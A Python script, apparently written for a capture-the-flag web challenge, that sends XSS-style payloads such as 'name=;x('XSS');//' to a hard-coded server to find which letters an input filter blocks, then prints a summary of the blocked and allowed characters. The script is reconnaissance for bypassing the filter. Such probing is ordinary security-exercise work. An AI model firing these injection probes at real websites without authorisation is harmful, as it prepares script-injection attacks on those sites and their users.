import requests

# Target URL
url = "http://94.237.49.241:4200/page"

print("=" * 60)
print("Testing individual letters for character filter blocking")
print("Server connectivity test first...")
print("=" * 60)
print()

# First test basic connectivity
try:
    print("Testing basic connectivity to server...")
    response = requests.get(url, timeout=30)
    print(f"GET request successful!")
    print(f"Status Code: {response.status_code}")
    print(f"Response length: {len(response.text)} characters")
    if response.text:
        print(f"First 200 chars:\n{response.text[:200]}")
    print()
except Exception as e:
    print(f"[ERROR] Basic connectivity test failed: {str(e)}")
    print()

# Now test individual letters (if we have basic connectivity)
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

blocked_chars = []
allowed_chars = []

for i, letter in enumerate(letters_to_test):
    # Create payload: name=;[letter]('XSS');//
    payload = f"name=;{letter}('XSS');//"
    
    print(f"Testing letter: '{letter}' (Test {i+1}/{len(letters_to_test)})")
    print(f"Payload: {payload}")
    
    try:
        # Send POST request with extended timeout
        response = requests.post(url, data=payload, timeout=30)
        
        # Check if the response contains the blocked message pattern
        blocked_pattern = f"Sorry you can't use: '{letter}'"
        
        if blocked_pattern in response.text:
            print(f"  [BLOCKED] Character '{letter}' is blocked by filter")
            print(f"  Response contains: '{blocked_pattern}'")
            blocked_chars.append(letter)
            # Print relevant part of response
            if len(response.text) < 500:
                print(f"  Full response:\n{response.text}")
            else:
                lines = response.text.split('\n')
                for line in lines:
                    if blocked_pattern in line:
                        print(f"  Response line: {line.strip()}")
                        break
        else:
            print(f"  [ALLOWED] Character '{letter}' is NOT blocked")
            allowed_chars.append(letter)
            print(f"  Status Code: {response.status_code}")
            print(f"  Response length: {len(response.text)}B")
            # Print a snippet to confirm
            if len(response.text) > 0 and len(response.text) < 500:
                print(f"  Response:\n{response.text}")
            elif len(response.text) >= 500:
                print(f"  Response (first 300 chars):\n{response.text[:300]}")
        
    except Exception as e:
        print(f"  [ERROR] Failed to test letter '{letter}': {str(e)}")
        print()
        continue
    
    print()

# Summary
print("=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"Blocked characters ({len(blocked_chars)}):")
for char in blocked_chars:
    print(f"  - '{char}'")

print()
print(f"Allowed characters ({len(allowed_chars)}):")
for char in allowed_chars:
    print(f"  - '{char}'")

print()
print("Character filter test completed.")
